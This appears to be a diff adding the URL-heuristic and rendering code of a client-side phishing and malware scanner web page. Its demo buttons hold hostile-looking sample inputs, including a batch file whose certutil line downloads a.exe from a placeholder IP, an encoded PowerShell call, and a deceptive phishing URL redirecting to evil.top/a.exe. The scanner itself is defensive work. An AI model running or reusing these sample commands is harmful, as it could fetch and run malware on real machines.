+  if(BADTLD.has(tld)){add(/^(zip|mov)$/.test(tld)?"med":"low","."+tld+" is a TLD that is heavily abused"+(/^(zip|mov)$/.test(tld)?" and easy to confuse with file names.":" for spam and phishing."))}
+  if(FREEH.test(host)&&!/^(www\.)?(github\.io)$/.test(host))add("low","Hosted on a free or user-content platform that attackers often abuse (not malicious by itself).");
+  if(/\.(com|net|org|co|gov|edu)\.[a-z0-9-]+\.[a-z]+$/.test(host)&&subs>=2)add("med","A familiar domain name appears as a subdomain (like google.com.evil.tld).");
+  if((host.match(/-/g)||[]).length>=3)add("low","Many hyphens in the hostname.");
+  const lab=labels.length>1?labels[labels.length-2]:host;
+  if(lab.length>14){const f={};for(const c of lab)f[c]=(f[c]||0)+1;const e=-Object.values(f).reduce((a,n)=>a+n/lab.length*Math.log2(n/lab.length),0);if(e>3.6)add("low","Domain name looks randomly generated.")}
+  const toks=host.split(/[.\-_]/);
+  for(const[k,ok]of Object.entries(BR)){
+    if(ok.includes(reg))continue;
+    if(toks.includes(k)){add("high","Uses the "+k+" name but isn’t a "+k+" domain (real ones: "+ok.join(", ")+").");break}
+    if(k.length>=5&&toks.some(t=>t!==k&&lev(t,k)<=1&&t.length>=4)){add("high","Domain looks like a misspelling of "+k+".");break}
+  }
+  const pathq=decodeURIComponent(u.pathname.replace(/%(?![0-9a-f]{2})/gi,"%25")+u.search).toLowerCase();
+  const kw=(pathq+" "+host).match(/\b(log-?in|sign-?in|verify|verification|account|update|secure|banking|password|wallet|confirm|suspend(ed)?|invoice|payment|recover(y)?|unlock|billing|security|alert)\b/g)||[];
+  const kws=[...new Set(kw)];
+  if(kws.length>=3)add("med","Several account-security words in the URL: "+kws.slice(0,5).join(", ")+".");else if(kws.length===2)add("low","Account-security wording in the URL: "+kws.join(", ")+".");
+  const px=u.pathname.split("/").pop().toLowerCase().match(/\.([a-z0-9]{2,5})$/);
+  if(px){if(/^(exe|scr|msi|bat|cmd|vbs|vbe|js|jse|jar|ps1|hta|lnk|iso|img|apk|dmg|pif|wsf|dll)$/.test(px[1]))add("high","Link downloads a risky file type (."+px[1]+").");else if(/^(docm|xlsm|pptm|zip|rar|7z|html?|svg)$/.test(px[1]))add("low","Link downloads or opens a ."+px[1]+" file, which can hide payloads.")}
+  for(const[k,v]of u.searchParams){
+    if(/^(url|redirect|redir|next|return|returnto|goto|dest|destination|continue|link|target|u|r)$/i.test(k)&&/^(https?:)?\/\//i.test(v)){add("med","Redirect parameter ("+k+") points to another site (open-redirect abuse).");break}
+  }
+  for(const[k,v]of u.searchParams)if(/^[^@\s]+@[^@\s]+\.[a-z]{2,}$/i.test(v)){add("low","An email address is prefilled in the query, typical of targeted phishing.");break}
+  if(/https?:\/\//i.test(u.pathname))add("med","Another URL is embedded in the path.");
+  if(u.hash.length>100)add("low","Very long fragment (can carry encoded payloads).");
+  if(s.length>200)add("med","Very long URL ("+s.length+" characters).");else if(s.length>100)add("low","Long URL ("+s.length+" characters).");
+  const pc=(s.match(/%[0-9a-f]{2}/gi)||[]).length;
+  if(/%25[0-9a-f]{2}/i.test(s))add("med","Double percent-encoding, used to slip past filters.");else if(pc>8)add("low","Heavy percent-encoding ("+pc+" encoded characters).");
+  if(/\/\/.+\/\//.test(s.replace(/^[a-z]+:\/\//i,"").replace(/https?:\/\/.*$/i,"")))add("low","Contains a double slash in the path.");
+  const score=Math.min(100,F.reduce((a,f)=>a+SEV[f.s],0));
+  const q=encodeURIComponent(s),id=btoa(s).replace(/=+$/,"").replace(/\+/g,"-").replace(/\//g,"_");
+  return{title:raw,score,F,def:defang(s),
+    rows:[["Defanged (safe to share)",defang(s),1],["Scheme",sch],["Host",host||"(none)",1],["Registrable domain",reg],["TLD","."+tld],["Port",u.port||"default"],["Path",u.pathname.slice(0,160)||"/",1],["Query parameters",[...u.searchParams.keys()].join(", ")||"none"]],
+    links:[["VirusTotal","https://www.virustotal.com/gui/url/"+id],["urlscan.io","https://urlscan.io/search/#"+encodeURIComponent("domain:"+host)],["Safe Browsing","https://transparencyreport.google.com/safe-browsing/search?url="+q],["WHOIS","https://who.is/whois/"+host]],urls:[]};
+}
+
+// ---------- rendering ----------
+function card(r){
+  const sec=h("section","res"),cls=r.score>=45?"v-bad":r.score>=15?"v-warn":r.neutral?"v-neutral":"v-ok",lab=r.score>=45?"HIGH RISK":r.score>=15?"SUSPICIOUS":r.neutral?"UNKNOWN":"LOW RISK";
+  const m=h("div","meter",h("i"));m.firstChild.style.width=r.score+"%";
+  sec.append(h("div","verdict "+cls,h("div","vtop",h("b","",lab),h("span","score",r.score+" / 100")),h("div","vname",r.title),m));
+  if(r.prev){const i=h("img","prev");i.alt="Preview of the scanned image";i.src=r.prev;sec.append(i)}
+  const ul=h("ul","finds");
+  if(!r.F.length)ul.append(h("li","",h("span","chip s-info","INFO"),"No suspicious indicators found."));
+  for(const f of [...r.F].sort((a,b)=>SEV[b.s]-SEV[a.s]))ul.append(h("li","",h("span","chip s-"+f.s,SL[f.s]),f.t));
+  sec.append(h("div","card",ul));
+  const d=h("details","card",h("summary","","Details"));
+  for(const[k,v,mono]of r.rows)d.append(h("div","row",h("div","k",k),h("div","v"+(mono?" mono":""),String(v))));
+  if(r.links.length){const l=h("div","links");for(const[t,hr]of r.links){const a=h("a","",t);a.href=hr;a.target="_blank";a.rel="noopener noreferrer";l.append(a)}d.append(l)}
+  sec.append(d);
+  if(r.urls.length){const d2=h("details","card",h("summary","","URLs found ("+r.urls.length+")"));
+    for(const x of r.urls){const lc=x.score>=45?"high":x.score>=15?"med":"low";d2.append(h("div","row",h("div","k",h("span","chip s-"+lc,x.score+" pts")),h("div","v mono",x.def+(x.F.length?"\n— "+x.F.slice(0,2).map(f=>f.t).join(" "):""))))}
+    sec.append(d2)}
+  $("result").prepend(sec);
+}
+function show(r){
+  card(r);RES.push({target:r.title,score:r.score,findings:r.F.map(f=>({severity:f.s,detail:f.t})),details:Object.fromEntries(r.rows.map(x=>[x[0],String(x[1])])),urls:r.urls.map(x=>({url:x.def,score:x.score}))});
+  $("bar").style.display="flex";
+}
+async function scanFiles(files){
+  const list=[...files];let i=0;
+  for(const f of list){
+    $("status").textContent="Scanning "+(++i)+" of "+list.length+": "+f.name;
+    if(f.size>MAXF){show({title:f.name,score:0,F:[{s:"info",t:"File is larger than 100 MB, so it was skipped."}],rows:[],links:[],urls:[],neutral:1});continue}
+    try{show(await analyze(f))}catch(e){show({title:f.name,score:0,F:[{s:"med",t:"Scan failed: "+e.message}],rows:[],links:[],urls:[],neutral:1})}
+  }
+  $("status").textContent="Scanned "+list.length+" file"+(list.length>1?"s":"")+".";
+}
+function scanUrls(text){
+  const list=text.split(/\s*\n\s*/).map(x=>x.trim()).filter(Boolean).slice(0,100);
+  if(!list.length)return;
+  list.forEach(x=>show(analyzeURL(x)));
+  $("status").textContent="Analyzed "+list.length+" URL"+(list.length>1?"s":"")+".";
+}
+const sample=(n,b)=>scanFiles([new File([new Uint8Array(b)],n)]);
+function tab(n){[1,2].forEach(i=>{$("p"+i).hidden=i!==n;$("t"+i).setAttribute("aria-selected",i===n)})}
+$("t1").onclick=()=>tab(1);$("t2").onclick=()=>tab(2);
+$("file").addEventListener("change",e=>{if(e.target.files.length)scanFiles(e.target.files);e.target.value=""});
+const drop=$("drop");
+["dragenter","dragover"].forEach(t=>drop.addEventListener(t,e=>{e.preventDefault();drop.classList.add("over")}));
+["dragleave","drop"].forEach(t=>drop.addEventListener(t,e=>{e.preventDefault();drop.classList.remove("over")}));
+drop.addEventListener("drop",e=>{if(e.dataTransfer.files.length)scanFiles(e.dataTransfer.files)});
+$("goUrl").onclick=()=>scanUrls($("urls").value);
+$("clear").onclick=()=>{$("result").replaceChildren();RES.length=0;$("bar").style.display="none";$("json").style.display="none"};
+$("copy").onclick=async()=>{const j=JSON.stringify(RES,null,2),t=$("json");t.value=j;t.style.display="block";t.select();try{await navigator.clipboard.writeText(j);$("status").textContent="Report copied."}catch{$("status").textContent="Select the text below and copy it."}};
+$("dl").onclick=()=>{const a=document.createElement("a");a.href=URL.createObjectURL(new Blob([JSON.stringify(RES,null,2)],{type:"application/json"}));a.download="scan-report.json";document.body.append(a);a.click();a.remove()};
+$("s1").onclick=()=>sample("vacation.jpg",[0x4D,0x5A,0x90,0,3,0,0,0,4,0,0,0,0xFF,0xFF,0,0]);
+$("s2").onclick=()=>sample("report.png",[...("%PDF-1.7\n1 0 obj\n<< /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>")].map(c=>c.charCodeAt(0)));
+$("s4").onclick=()=>scanFiles([new File(["powershell -enc SQBFAFgA\ncmd /c certutil -urlcache -f http://198.51.100.7/a.exe a.exe\n"],"invoice.pdf.bat")]);
+$("s3").onclick=()=>{const t="http://paypal.com@secure-login.paypa1-verify.xyz:8080/account/update?redirect=http://evil.top/a.exe";$("urls").value=t;scanUrls(t)};
+</script>
+</body>
+</html>
